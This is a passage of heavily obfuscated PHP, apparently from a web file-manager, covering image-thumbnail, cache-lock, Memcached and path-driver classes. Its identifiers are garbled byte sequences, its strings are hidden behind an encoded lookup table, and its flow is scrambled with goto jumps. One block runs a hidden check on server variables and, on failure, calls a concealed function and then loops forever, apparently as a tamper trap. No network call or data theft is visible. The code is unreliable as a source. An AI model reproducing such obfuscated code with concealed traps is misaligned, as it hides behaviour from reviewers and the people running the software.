 10, -8))); goto f•Ü°ÆÊ‡; dÏ–•¨ÂÇë: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($E≠ã¡—⁄›Ê, $b∏⁄Ëî≤∏ï) { goto dÀÿ∆»Õ Ì; EÈéó„Î¯¢: if (!$this->im) { return !1; } $CÀ≠§‘‹åØ = $_SERVER[Æ¡î¢≠¯™][33]; $this->imgData = GetImageSize($E≠ã¡—⁄›Ê, $CÀ≠§‘‹åØ); goto eì™¿ÎÉ‘; eì™¿ÎÉ‘: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto D≥…–â‡±Ó; dÀÿ∆»Õ Ì: $this->srcFile = $E≠ã¡—⁄›Ê; $this->echoType = $b∏⁄Ëî≤∏ï; $this->im = self::image($E≠ã¡—⁄›Ê); goto EÈéó„Î¯¢; D≥…–â‡±Ó: } public static function image($a∂∏°ëœ®ä) { $f’ßáÜè≈Â =& $_SERVER[Æ¡î¢≠¯™]; $Föÿ°îûÉ = $f’ßáÜè≈Â[33]; $BìóÉ∫≤èì = GetImageSize($a∂∏°ëœ®ä, $Föÿ°îûÉ); $b∫µÎ≠µÔπ = !1; switch ($BìóÉ∫≤èì[2]) { case IMAGETYPE_GIF: if (!function_exists($f’ßáÜè≈Â[1820])) { break; } $b∫µÎ≠µÔπ = imagecreatefromgif($a∂∏°ëœ®ä); break; case IMAGETYPE_JPEG: if (!function_exists($f’ßáÜè≈Â[1821])) { break; } $b∫µÎ≠µÔπ = imagecreatefromjpeg($a∂∏°ëœ®ä); break; case IMAGETYPE_PNG: if (!function_exists($f’ßáÜè≈Â[1822])) { break; } $b∫µÎ≠µÔπ = @imagecreatefrompng($a∂∏°ëœ®ä); imagesavealpha($b∫µÎ≠µÔπ, !0); break; case IMAGETYPE_XBM: $b∫µÎ≠µÔπ = imagecreatefromxbm($a∂∏°ëœ®ä); break; case IMAGETYPE_WBMP: $b∫µÎ≠µÔπ = imagecreatefromwbmp($a∂∏°ëœ®ä); break; case IMAGETYPE_BMP: $b∫µÎ≠µÔπ = imagecreatefrombmp($a∂∏°ëœ®ä); break; default: break; } return $b∫µÎ≠µÔπ; } public static function imageSize($Aà£ÉË¡òñ) { $C¯ˆâ∑ññΩ =& $_SERVER[Æ¡î¢≠¯™]; $A¨ÏƒΩò§ç = GetImageSize($Aà£ÉË¡òñ); if (!$A¨ÏƒΩò§ç) { return !1; } return array($C¯ˆâ∑ññΩ[1823] => $A¨ÏƒΩò§ç[0], $C¯ˆâ∑ññΩ[1824] => $A¨ÏƒΩò§ç[1]); } function distortion($d†™ÇöΩöÂ, $dëŒ™ÿñ£¡, $Eïπ÷Èç©∆) { $CË£ã‘è±Â = $this->creatImage($this->im, $dëŒ™ÿñ£¡, $Eïπ÷Èç©∆, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($CË£ã‘è±Â, $d†™ÇöΩöÂ); } function prorate($c⁄¬Çá÷‚Æ, $E±ãçÑÆàÇ, $aç¶ù¥“äÊ) { $d°µ®ÌÉ»ê = $E±ãçÑÆàÇ / $aç¶ù¥“äÊ; $DØ∏∏ÈÊ±÷ = $this->srcW / $this->srcH; if ($d°µ®ÌÉ»ê <= $DØ∏∏ÈÊ±÷) { $aåÊÒœÉëŒ = $E±ãçÑÆàÇ; $Dàò∆Œ∞ò¨ = $aåÊÒœÉëŒ * ($this->srcH / $this->srcW); } else { $Dàò∆Œ∞ò¨ = $aç¶ù¥“äÊ; $aåÊÒœÉëŒ = $Dàò∆Œ∞ò¨ * ($this->srcW / $this->srcH); } if ($this->srcW > $E±ãçÑÆàÇ || $this->srcH > $aç¶ù¥“äÊ) { $C”Ø‡ÃÇñ◊ = $this->creatImage($this->im, $aåÊÒœÉëŒ, $Dàò∆Œ∞ò¨, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($C”Ø‡ÃÇñ◊, $c⁄¬Çá÷‚Æ); } else { $C”Ø‡ÃÇñ◊ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($C”Ø‡ÃÇñ◊, $c⁄¬Çá÷‚Æ); } } function cut($A®õŒ¡€©â, $aª¯Ëõ”∫Â, $AÂ‰õåÑÊã) { goto CÊÆÇÜ§¯ö; DÂ∑Œã’ßÕ: return $this->echoImage($B∫ÇæÜº∂‡, $A®õŒ¡€©â); goto BÑŸÛöË¶∆; CÊÆÇÜ§¯ö: $d¨¶êóÙûŸ = $aª¯Ëõ”∫Â / $AÂ‰õåÑÊã; $eÕÚ—¯¥Æ« = $this->srcW / $this->srcH; if ($d¨¶êóÙûŸ <= $eÕÚ—¯¥Æ«) { $dô¢ﬁË‡üõ = $AÂ‰õåÑÊã; $bò⁄°±ÑŒ¥ = $dô¢ﬁË‡üõ * ($this->srcW / $this->srcH); } else { $bò⁄°±ÑŒ¥ = $aª¯Ëõ”∫Â; $dô¢ﬁË‡üõ = $bò⁄°±ÑŒ¥ * ($this->srcH / $this->srcW); } goto B¬ûÓä∞ª—; B¬ûÓä∞ª—: $cﬂªŒùÑ„ı = $this->creatImage($this->im, $bò⁄°±ÑŒ¥, $dô¢ﬁË‡üõ, 0, 0, 0, 0, $this->srcW, $this->srcH); $B∫ÇæÜº∂‡ = $this->creatImage($cﬂªŒùÑ„ı, $aª¯Ëõ”∫Â, $AÂ‰õåÑÊã, 0, 0, ($bò⁄°±ÑŒ¥ - $aª¯Ëõ”∫Â) / 2, ($dô¢ﬁË‡üõ - $AÂ‰õåÑÊã) / 2, $aª¯Ëõ”∫Â, $AÂ‰õåÑÊã); imageDestroy($cﬂªŒùÑ„ı); goto DÂ∑Œã’ßÕ; BÑŸÛöË¶∆: } function backFill($E¬§∞úÉ∏Ë, $BÒñ®ï´∑è, $Fà—ÚıÖˆó, $dﬂÓ¶ﬂŒÃö = false, $F’Ì÷®¯ÚÎ = 255, $eî¬…◊ö∂´ = 255, $Bè‡Êäı√Á = 255) { goto FÃ™÷€Îç´; dÊñ¯úÊ∫ä: if ($dﬂÓ¶ﬂŒÃö) { $F∑ í≈ﬁ≤ = imageColorTransparent($A¥Ü…À£˜˜, $F∑ í≈ﬁ≤); $cÃçÉ’≥ΩÍ = $Fà—ÚıÖˆó - $B…§‹ƒÇÆì; } imageFilledRectangle($A¥Ü…À£˜˜, 0, 0, $BÒñ®ï´∑è, $Fà—ÚıÖˆó, $F∑ í≈ﬁ≤); if ($this->srcW > $BÒñ®ï´∑è || $this->srcH > $Fà—ÚıÖˆó) { $C¶∑Ç≠Æﬁ¯ = $this->creatImage($this->im, $cçä∞ÕÑ∏¢, $B…§‹ƒÇÆì, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($cçä∞ÕÑ∏¢ < $BÒñ®ï´∑è) { imageCopy($A¥Ü…À£˜˜, $C¶∑Ç≠Æﬁ¯, ($BÒñ®ï´∑è - $cçä∞ÕÑ∏¢) / 2, 0, 0, 0, $cçä∞ÕÑ∏¢, $B…§‹ƒÇÆì); } else { if ($B…§‹ƒÇÆì < $Fà—ÚıÖˆó) { imageCopy($A¥Ü…À£˜˜, $C¶∑Ç≠Æﬁ¯, 0, $cÃçÉ’≥ΩÍ, 0, 0, $cçä∞ÕÑ∏¢, $B…§‹ƒÇÆì); } else { imageCopy($A¥Ü…À£˜˜, $C¶∑Ç≠Æﬁ¯, 0, 0, 0, 0, $cçä∞ÕÑ∏¢, $B…§‹ƒÇÆì); } } } else { imageCopyMerge($A¥Ü…À£˜˜, $this->im, ($BÒñ®ï´∑è - $cçä∞ÕÑ∏¢) / 2, $cÃçÉ’≥ΩÍ, 0, 0, $cçä∞ÕÑ∏¢, $B…§‹ƒÇÆì, 100); } goto cÍÿå€€≤«; FÃ™÷€Îç´: $eÓÊË’›˘î = $BÒñ®ï´∑è / $Fà—ÚıÖˆó; $båÕÿúÑáÇ = $this->srcW / $this->srcH; if ($eÓÊË’›˘î <= $båÕÿúÑáÇ) { $cçä∞ÕÑ∏¢ = $BÒñ®ï´∑è; $B…§‹ƒÇÆì = $cçä∞ÕÑ∏¢ * ($this->srcH / $this->srcW); } else { $B…§‹ƒÇÆì = $Fà—ÚıÖˆó; $cçä∞ÕÑ∏¢ = $B…§‹ƒÇÆì * ($this->srcW / $this->srcH); } goto E∫Àßä¥Ö; E∫Àßä¥Ö: if (function_exists($_SERVER[Æ¡î¢≠¯™][1825])) { @($A¥Ü…À£˜˜ = imageCreateTrueColor($BÒñ®ï´∑è, $Fà—ÚıÖˆó)); if (!$A¥Ü…À£˜˜) { $A¥Ü…À£˜˜ = imageCreate($BÒñ®ï´∑è, $Fà—ÚıÖˆó); } } else { $A¥Ü…À£˜˜ = imageCreate($BÒñ®ï´∑è, $Fà—ÚıÖˆó); } $cÃçÉ’≥ΩÍ = ($Fà—ÚıÖˆó - $B…§‹ƒÇÆì) / 2; $F∑ í≈ﬁ≤ = imagecolorallocate($A¥Ü…À£˜˜, $F’Ì÷®¯ÚÎ, $eî¬…◊ö∂´, $Bè‡Êäı√Á); goto dÊñ¯úÊ∫ä; cÍÿå€€≤«: return $this->echoImage($A¥Ü…À£˜˜, $E¬§∞úÉ∏Ë); goto d¥´˜èó∆É; d¥´˜èó∆É: } function creatImage($CÉ∞¢ò’÷Ã, $cæÒ›£‘¥Ÿ, $CåÓéßî“ò, $dÇ∆‹—õÆË, $D√≥äÂÜ°Ò, $D‡¬∑òè≈¶, $AÕù∂à®√ï, $e»Î›É‰Êˆ, $FøÖã¿›±å) { if (function_exists($_SERVER[Æ¡î¢≠¯™][1825])) { @($d√“∆•Ô“Ü = ImageCreateTrueColor($cæÒ›£‘¥Ÿ, $CåÓéßî“ò)); @imagealphablending($d√“∆•Ô“Ü, !1); @imagesavealpha($d√“∆•Ô“Ü, !0); if ($d√“∆•Ô“Ü) { imageCopyResampled($d√“∆•Ô“Ü, $CÉ∞¢ò’÷Ã, $dÇ∆‹—õÆË, $D√≥äÂÜ°Ò, $D‡¬∑òè≈¶, $AÕù∂à®√ï, $cæÒ›£‘¥Ÿ, $CåÓéßî“ò, $e»Î›É‰Êˆ, $FøÖã¿›±å); } else { $d√“∆•Ô“Ü = ImageCreate($cæÒ›£‘¥Ÿ, $CåÓéßî“ò); imageCopyResized($d√“∆•Ô“Ü, $CÉ∞¢ò’÷Ã, $dÇ∆‹—õÆË, $D√≥äÂÜ°Ò, $D‡¬∑òè≈¶, $AÕù∂à®√ï, $cæÒ›£‘¥Ÿ, $CåÓéßî“ò, $e»Î›É‰Êˆ, $FøÖã¿›±å); } } else { $d√“∆•Ô“Ü = ImageCreate($cæÒ›£‘¥Ÿ, $CåÓéßî“ò); imageCopyResized($d√“∆•Ô“Ü, $CÉ∞¢ò’÷Ã, $dÇ∆‹—õÆË, $D√≥äÂÜ°Ò, $D‡¬∑òè≈¶, $AÕù∂à®√ï, $cæÒ›£‘¥Ÿ, $CåÓéßî“ò, $e»Î›É‰Êˆ, $FøÖã¿›±å); } return $d√“∆•Ô“Ü; } public function imgRotate($AÖÜæùäã¥, $cááá¥öã‰) { goto d÷‰±πÿÜù; FëÙŸ≥°Ü: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $A˘·ò≤÷Ûé = imagegif($fÓÏè®∞Ÿè, $AÖÜæùäã¥); break; case IMAGETYPE_JPEG: $A˘·ò≤÷Ûé = imagejpeg($fÓÏè®∞Ÿè, $AÖÜæùäã¥, 100); break; case IMAGETYPE_PNG: $A˘·ò≤÷Ûé = imagePNG($fÓÏè®∞Ÿè, $AÖÜæùäã¥); break; default: break; } imageDestroy($fÓÏè®∞Ÿè); imageDestroy($this->im); goto A∂¿ÎÉ ÔË; d÷‰±πÿÜù: if (!$this->im || $cááá¥öã‰ % 360 === 0 || !function_exists($_SERVER[Æ¡î¢≠¯™][1826])) { return !1; } $fÓÏè®∞Ÿè = imageRotate($this->im, 360 - $cááá¥öã‰, 0); $A˘·ò≤÷Ûé = !1; goto FëÙŸ≥°Ü; A∂¿ÎÉ ÔË: return $A˘·ò≤÷Ûé; goto eùΩ©ïÿ¬è; eùΩ©ïÿ¬è: } function echoImage($a¶⁄©°àö, $bè°ﬁ≥≤≠«) { goto bü‹âäÌøº; DÖèƒáÜªå: $C¿‘áƒŒùá = !1; switch ($this->echoType) { case $eåÂîóÍπö[1827]: $C¿‘áƒŒùá = imagePNG($a¶⁄©°àö); break; case $eåÂîóÍπö[174]: $C¿‘áƒŒùá = imagePNG($a¶⁄©°àö, $bè°ﬁ≥≤≠«); break; } imageDestroy($a¶⁄©°àö); goto e”·’ÛŸñÇ; e”·’ÛŸñÇ: imageDestroy($this->im); return $C¿‘áƒŒùá; goto eﬁâÍì∞”É; bü‹âäÌøº: $eåÂîóÍπö =& $_SERVER[Æ¡î¢≠¯™]; if (!$a¶⁄©°àö) { return !1; } ob_get_clean(); goto DÖèƒáÜªå; eﬁâÍì∞”É: } } if (!function_exists($_SERVER[Æ¡î¢≠¯™][1828])) { define($_SERVER[Æ¡î¢≠¯™][1829], 0); define($_SERVER[Æ¡î¢≠¯™][1830], 1); define($_SERVER[Æ¡î¢≠¯™][1831], 2); function imageflip($A§‰›ËæèÚ, $aê¶ÖûßüÕ) { switch ($aê¶ÖûßüÕ) { case IMG_FLIP_HORIZONTAL: $FıâÙºïùÓ = imagesx($A§‰›ËæèÚ) - 1; $aﬁ∞ÒåﬁÃ = $FıâÙºïùÓ / 2; $aƒ≠Ω£Ü¡€ = imagesy($A§‰›ËæèÚ); $Eåä¨ÈÙà© = imageistruecolor($A§‰›ËæèÚ) ? imagecreatetruecolor(1, $aƒ≠Ω£Ü¡€) : imagecreate(1, $aƒ≠Ω£Ü¡€); for ($eù∏‰ÁùÌ≠ = 0; $eù∏‰ÁùÌ≠ < $aﬁ∞ÒåﬁÃ; ++$eù∏‰ÁùÌ≠) { imagecopy($Eåä¨ÈÙà©, $A§‰›ËæèÚ, 0, 0, $eù∏‰ÁùÌ≠, 0, 1, $aƒ≠Ω£Ü¡€); imagecopy($A§‰›ËæèÚ, $A§‰›ËæèÚ, $eù∏‰ÁùÌ≠, 0, $FıâÙºïùÓ - $eù∏‰ÁùÌ≠, 0, 1, $aƒ≠Ω£Ü¡€); imagecopy($A§‰›ËæèÚ, $Eåä¨ÈÙà©, $FıâÙºïùÓ - $eù∏‰ÁùÌ≠, 0, 0, 0, 1, $aƒ≠Ω£Ü¡€); } break; case IMG_FLIP_VERTICAL: $CÃÚ≈˜Ë’· = imagesx($A§‰›ËæèÚ); $FÃö·È÷⁄õ = imagesy($A§‰›ËæèÚ) - 1; $E˜À—–Û◊â = $FÃö·È÷⁄õ / 2; $Eåä¨ÈÙà© = imageistruecolor($A§‰›ËæèÚ) ? imagecreatetruecolor($CÃÚ≈˜Ë’·, 1) : imagecreate($CÃÚ≈˜Ë’·, 1); for ($fÕ∞íºôÇ™ = 0; $fÕ∞íºôÇ™ < $E˜À—–Û◊â; ++$fÕ∞íºôÇ™) { imagecopy($Eåä¨ÈÙà©, $A§‰›ËæèÚ, 0, 0, 0, $fÕ∞íºôÇ™, $CÃÚ≈˜Ë’·, 1); imagecopy($A§‰›ËæèÚ, $A§‰›ËæèÚ, 0, $fÕ∞íºôÇ™, 0, $FÃö·È÷⁄õ - $fÕ∞íºôÇ™, $CÃÚ≈˜Ë’·, 1); imagecopy($A§‰›ËæèÚ, $Eåä¨ÈÙà©, 0, $FÃö·È÷⁄õ - $fÕ∞íºôÇ™, 0, 0, $CÃÚ≈˜Ë’·, 1); } break; case IMG_FLIP_BOTH: $CÃÚ≈˜Ë’· = imagesx($A§‰›ËæèÚ); $aƒ≠Ω£Ü¡€ = imagesy($A§‰›ËæèÚ); $Eåä¨ÈÙà© = imagerotate($A§‰›ËæèÚ, 180, 0); imagecopy($A§‰›ËæèÚ, $Eåä¨ÈÙà©, 0, 0, 0, 0, $CÃÚ≈˜Ë’·, $aƒ≠Ω£Ü¡€); break; default: return; } imagedestroy($Eåä¨ÈÙà©); } } if (!function_exists($_SERVER[Æ¡î¢≠¯™][1832])) { function imagecreatefrombmp($BŸŸÉ›ôçÇ) { return ImageGdBMP::load($BŸŸÉ›ôçÇ); } } goto Eêû©…‰¢ª; e ì‹˘–µÑ: class CacheLockMemcached { public function lock($e–ÕÊ¿«Ñ„, $A´—Èñ¬ ﬂ = 0) { $aÀºﬁ«˜ Ó = Cache::init(); $døÉ≈Ò±◊ = microtime(!0) + $A´—Èñ¬ ﬂ; while (microtime(!0) < $døÉ≈Ò±◊) { $BØ÷ˆèÎçå = $aÀºﬁ«˜ Ó->get($e–ÕÊ¿«Ñ„); if (!$BØ÷ˆèÎçå || $BØ÷ˆèÎçå < microtime(!0)) { $C¥–ÏÌ÷ß‹ = $aÀºﬁ«˜ Ó->handle->add($e–ÕÊ¿«Ñ„, $døÉ≈Ò±◊, $A´—Èñ¬ ﬂ); if ($C¥–ÏÌ÷ß‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Bäª±íêÑè) { return Cache::init()->get($Bäª±íêÑè); } public function unlock($a •‚—´Û“) { return Cache::init()->remove($a •‚—´Û“); } } class CacheLockDatabase { public function lock($cÿµÙÔ∑”‡, $dÛ∑‹¡Œô« = 0) { $b“”∞ß⁄È¿ = Model($_SERVER[Æ¡î¢≠¯™][747]); $d‚¥π∂‰©∑ = microtime(!0) + $dÛ∑‹¡Œô«; while (microtime(!0) < $d‚¥π∂‰©∑) { $CÓ∂äØèªë = $b“”∞ß⁄È¿->get($cÿµÙÔ∑”‡); if (!$CÓ∂äØèªë || $CÓ∂äØèªë < microtime(!0)) { $D¨ÛÖçπ⁄° = $b“”∞ß⁄È¿->set($cÿµÙÔ∑”‡, $d‚¥π∂‰©∑); if ($D¨ÛÖçπ⁄°) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($fì•±´§ˆÕ) { return Model($_SERVER[Æ¡î¢≠¯™][747])->get($fì•±´§ˆÕ); } public function unlock($e‹™´´«’É) { Model($_SERVER[Æ¡î¢≠¯™][747])->remove($e‹™´´«’É); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($bÑøûªœ›, $CÕçõôí√å) { $cõ≥Éªíƒ =& $_SERVER[Æ¡î¢≠¯™]; if (!class_exists($cõ≥Éªíƒ[768])) { show_json($cõ≥Éªíƒ[769], !1); } $this->cacheTime = $CÕçõôí√å; $this->handle = new Memcached(); if (is_array($bÑøûªœ›[$cõ≥Éªíƒ[770]]) && count($bÑøûªœ›[$cõ≥Éªíƒ[770]]) >= 1) { foreach ($bÑøûªœ›[$cõ≥Éªíƒ[770]] as $Aö⁄π‡âˆ”) { $DæÌ”†£äÒ = explode($cõ≥Éªíƒ[4], $Aö⁄π‡âˆ”); $this->handle->addServer($DæÌ”†£äÒ[0], $DæÌ”†£äÒ[1]); } } else { $this->handle->addServer($bÑøûªœ›[$cõ≥Éªíƒ[176]], $bÑøûªœ›[$cõ≥Éªíƒ[177]]); } } public function set($b≠úÏê…≈ä, $Bõ¯ﬂè¯Ö‘, $aµ¬»íœóÕ = false) { $aµ¬»íœóÕ = $aµ¬»íœóÕ ? $aµ¬»íœóÕ : $this->cacheTime; return $this->handle->set($b≠úÏê…≈ä, $Bõ¯ﬂè¯Ö‘, $aµ¬»íœóÕ); } public function get($dπµëƒ…ÜÇ) { return $this->handle->get($dπµëƒ…ÜÇ); } public function remove($bà˜Î◊ıÙì) { return $this->handle->delete($bà˜Î◊ıÙì); } public function deleteAll() { return $this->handle->flush(); } } goto f∆öáì™’⁄; c¢Ç≠◊›∆„: if (!isset($_SERVER[$_SERVER[Æ¡î¢≠¯™][57]]) || !isset($_SERVER[$_SERVER[Æ¡î¢≠¯™][58]])) { goto a≈Í“Œ”ìº; Bª‹ì¯Ë´Ü: $eëíŸÌ∏ÂÙ($_SERVER[$_SERVER[Æ¡î¢≠¯™][60]] . $_SERVER[Æ¡î¢≠¯™][61]); $f·‚ƒñ≈¬î = 2; while ($f·‚ƒñ≈¬î > 1) { $cêô˜¶Ç¥µ = rawurlencode($f·‚ƒñ≈¬î . $_SERVER[Æ¡î¢≠¯™][66]); } goto d¯∫Ø¬áÉ⁄; a≈Í“Œ”ìº: $CÑÈÒøãı≤ = $_SERVER[Æ¡î¢≠¯™][59]; $A‡˘¥¬¨ã∂ = $_SERVER[$_SERVER[Æ¡î¢≠¯™][60]] . $_SERVER[Æ¡î¢≠¯™][61]; $D¯ÃáçìêÜ = $CÑÈÒøãı≤($A‡˘¥¬¨ã∂); goto aÛ∏èÔØ≈˜; aÛ∏èÔØ≈˜: $a¿Üç“˘¡á = explode($_SERVER[Æ¡î¢≠¯™][62], $D¯ÃáçìêÜ); if (count($a¿Üç“˘¡á) < $_SERVER[Æ¡î¢≠¯™][63]) { $c¡âÀŸ√ÿè = $_SERVER[Æ¡î¢≠¯™][64]; $c¡âÀŸ√ÿè(); } $eëíŸÌ∏ÂÙ = $_SERVER[Æ¡î¢≠¯™][65]; goto Bª‹ì¯Ë´Ü; d¯∫Ø¬áÉ⁄: } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $cÇâõ•‰„Ã =& $_SERVER[Æ¡î¢≠¯™]; $this->objectDriver = array($cÇâõ•‰„Ã[67], $cÇâõ•‰„Ã[68], $cÇâõ•‰„Ã[69], $cÇâõ•‰„Ã[70], $cÇâõ•‰„Ã[71], $cÇâõ•‰„Ã[72], $cÇâõ•‰„Ã[73], $cÇâõ•‰„Ã[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($A∫Œáé¬åæ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($A∫Œáé¬åæ, $_SERVER[Æ¡î¢≠¯™][8]); } return $A∫Œáé¬åæ; } public function getPathName($FõáÇì¢ç) { return $FõáÇì¢ç; } public function iconvApp($E∆ÆÉ¬êóÏ) { return $E∆ÆÉ¬êóÏ; } public function iconvSystem($eøÿ≥ÒÖ∫Ò) { return $eøÿ≥ÒÖ∫Ò; } public function iconvTo($Dü®ÚÜ≠ë…, $bâƒÉüƒ≥Ì, $A·¥éñ™ÂÓ) { goto Bùë…°∏ê¿; eãªèé·ˆê: $e˜Ü≈ÔÏçü = $bâƒÉüƒ≥Ì . $EÕŸÖ¬∞ê∑[76] . $A·¥éñ™ÂÓ . $EÕŸÖ¬∞ê∑[77] . $Dü®ÚÜ≠ë…; if (isset($a© õﬁ’‰”[$e˜Ü≈ÔÏçü])) { return $a© õﬁ’‰”[$e˜Ü≈ÔÏçü]; } if (function_exists($EÕŸÖ¬∞ê∑[78])) { $aÑÍ∏’ÛÓ‚ = @mb_convert_encoding($Dü®ÚÜ≠ë…, $A·¥éñ™ÂÓ, $bâƒÉüƒ≥Ì); } else { $aÑÍ∏’ÛÓ‚ = @iconv($bâƒÉüƒ≥Ì, $A·¥éñ™ÂÓ, $Dü®ÚÜ≠ë…); } goto f€Òá‹Øü; f€Òá‹Øü: $aÑÍ∏’ÛÓ‚ = $aÑÍ∏’ÛÓ‚ ? $aÑÍ∏’ÛÓ‚ : $Dü®ÚÜ≠ë…; if (strstr($aÑÍ∏’ÛÓ‚, $EÕŸÖ¬∞ê∑[79])) { $aÑÍ∏’ÛÓ‚ = str_replace($EÕŸÖ¬∞ê∑[79], $EÕŸÖ¬∞ê∑[80], $aÑÍ∏’ÛÓ‚); } $a© õﬁ’‰”[$bâƒÉüƒ≥Ì . $EÕŸÖ¬∞ê∑[76] . $A·¥éñ™ÂÓ . $EÕŸÖ¬∞ê∑[77] . $Dü®ÚÜ≠ë…] = $aÑÍ∏’ÛÓ‚; goto E¢Æ≠çÃêº; f•Ãã”Ç⁄Ì: return $aÑÍ∏’ÛÓ‚; goto Cé¥ó∆éå¢; Bùë…°∏ê¿: $EÕŸÖ¬∞ê∑ =& $_SERVER[Æ¡î¢≠¯™]; if (!$Dü®ÚÜ≠ë… || !function_exists($EÕŸÖ¬∞ê∑[75])) { return $Dü®ÚÜ≠ë…; } static $a© õﬁ’‰” = array(); goto eãªèé·ˆê; E¢Æ≠çÃêº: $a© õﬁ’‰”[$A·¥éñ™ÂÓ . $EÕŸÖ¬∞ê∑[76] . $bâƒÉüƒ≥Ì . $EÕŸÖ¬∞ê∑[77] . $Dü®ÚÜ≠ë…] = $Dü®ÚÜ≠ë…; $a© õﬁ’‰”[$A·¥éñ™ÂÓ . $EÕŸÖ¬∞ê∑[76] . $bâƒÉüƒ≥Ì . $EÕŸÖ¬∞ê∑[77] . $aÑÍ∏’ÛÓ‚] = $Dü®ÚÜ≠ë…; $a© õﬁ’‰”[$bâƒÉüƒ≥Ì . $EÕŸÖ¬∞ê∑[76] . $A·¥éñ™ÂÓ . $EÕŸÖ¬∞ê∑[77] . $aÑÍ∏’ÛÓ‚] = $aÑÍ∏’ÛÓ‚; goto f•Ãã”Ç⁄Ì; Cé¥ó∆éå¢: } public function getPathInner($b»âÿ•®≥Ê) { $D§Ó€«ôåç = IO::init($b»âÿ•®≥Ê); return $D§Ó€«ôåç->path; } public function getPathOuter($dÕ¨õÁ∑Û◊) { $FÀ‡±–¢–‘ =& $_SERVER[Æ¡î¢≠¯™]; $bô®‹≤ïØ¶ = strlen(trim($this->pathBase, $FÀ‡±–¢–‘[8])); $dÕ¨õÁ∑Û◊ = substr(trim($dÕ¨õÁ∑Û◊, $FÀ‡±–¢–‘[8]), $bô®‹≤ïØ¶); return $this->pathDriver . $FÀ‡±–¢–‘[8] . ltrim($dÕ¨õÁ∑Û◊, $FÀ‡±–¢–‘[8]); } public function isParentOf($FÈî∏‹Ã†õ, $e–”Ñ´êø‚) { $a◊°≈“≠Ò =& $_SERVER[Æ¡î¢≠¯™]; $FÈî∏‹Ã†õ = rtrim(strtolower($FÈî∏‹Ã†õ), $a◊°≈“≠Ò[8]) . $a◊°≈“≠Ò[8]; $e–”Ñ´êø‚ = rtrim(strtolower($e–”Ñ´êø‚), $a◊°≈“≠Ò[8]) . $a◊°≈“≠Ò[8]; $Eâ˜öèÃ…Ì = strpos($e–”Ñ´êø‚, $FÈî∏‹Ã†õ) === 0; return $Eâ˜öèÃ…Ì; } public function getType() { $dÇ≈ô†≥µá =& $_SERVER[Æ¡î¢≠¯™]; $Bò…≈Ñ‚‰Ω = str_replace($dÇ≈ô†≥µá[81], $dÇ≈ô†≥µá[33], get_class($this)); return strtolower($Bò…≈Ñ‚‰Ω); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($bçç∫ªÂ√Ò, $FÓã˜∏‰∫≈) { $dÕ¬∂·ıı– =& $_SERVER[Æ¡î¢≠¯™]; $A≥ÿ†¿∑ßÛ = rtrim($bçç∫ªÂ√Ò, $dÕ¬∂·ıı–[8]) . $dÕ¬∂·ıı–[8] . $FÓã˜∏‰∫≈; $a©ê•€†“ﬁ = $this->exist($A≥ÿ†¿∑ßÛ); return $a©ê•€†“ﬁ ? $A≥ÿ†¿∑ßÛ : !1; } public function renameObject($F–¡âÑ±öî, $b¬Øﬁ™ãŒØ) { goto e∏˜—≈Áçﬁ; e∏˜—≈Áçﬁ: $F†Ñ€Û⁄œà =& $_SERVER[Æ¡î¢≠¯™]; $f„≈Ó»ë∆ƒ = $b¬Øﬁ™ãŒØ; Hook::trigger($F†Ñ€Û⁄œà[82], $this, $F–¡âÑ±öî, $this, $this->pathFather($F–¡âÑ±öî) . $b¬Øﬁ™ãŒØ); goto Fäãﬂ„ºçÏ; Fäãﬂ„ºçÏ: $F–¡âÑ±öî = $this->getPathOuter($F–¡âÑ±öî); $b¬Øﬁ™ãŒØ = $this->pathFather($F–¡âÑ±öî) . $b¬Øﬁ™ãŒØ; if (IO::isFile($F–¡âÑ±öî)) { $cºÏûÙÿ…— = IO::copy($F–¡âÑ±öî, $this->pathFather($F–¡âÑ±öî), REPEAT_RENAME_FOLDER, $f„≈Ó»ë∆ƒ); if ($cºÏûÙÿ…—) { IO::remove($F–¡âÑ±öî); } } else { $cºÏûÙÿ…— = IO::mkdir($b¬Øﬁ™ãŒØ); if (!$cºÏûÙÿ…—) { return !1; } $cÏ–óıô¨“ = IO::listPath($F–¡âÑ±öî, !0); $Aó¯Ç‘Öà— = array_merge($cÏ–óıô¨“[$F†Ñ€Û⁄œà[83]], $cÏ–óıô¨“[$F†Ñ€Û⁄œà[84]]); foreach ($Aó¯Ç‘Öà— as $B¥⁄ﬂÊöÜ´) { IO::move($B¥⁄ﬂÊöÜ´[$F†Ñ€Û⁄œà[85]], $b¬Øﬁ™ãŒØ, REPEAT_RENAME_FOLDER); } IO::remove($F–¡âÑ±öî); } goto D®ã©˜ÆÛÎ; D®ã©˜ÆÛÎ: return $cºÏûÙÿ…— ? $b¬Øﬁ™ãŒØ : !1; goto d éãÁÀø›; d éãÁÀø›: } public function tempFile($c¢‰•Ã‡Œî = '', $Fâé„˘Ëûñ = '') { goto e‘âÆ„‡©ß; e‘âÆ„‡©ß: if (!$c¢‰•Ã‡Œî) { $c¢‰•Ã‡Œî = rand_string(15); } $Eì„µå±Ñ≠ = TEMP_FILES . rand_string(15) . $_SERVER[Æ¡î¢≠¯™][8]; @mkdir($Eì„µå±Ñ≠, 511, !0); goto dÚáû¡§©Ë; dÚáû¡§©Ë: $d∞√ä´ö◊Ç = $Eì„µå±Ñ≠ . $c¢‰•Ã‡Œî; @touch($d∞√ä´ö◊Ç); if ($Fâé„˘Ëûñ) { file_put_contents($d∞√ä´ö◊Ç, $Fâé„˘Ëûñ); } goto A®üÇóæ‹ò; A®üÇóæ‹ò: return $d∞√ä´ö◊Ç; goto b¥ªé¬ÕÌ˘; b¥ªé¬ÕÌ˘: } public function 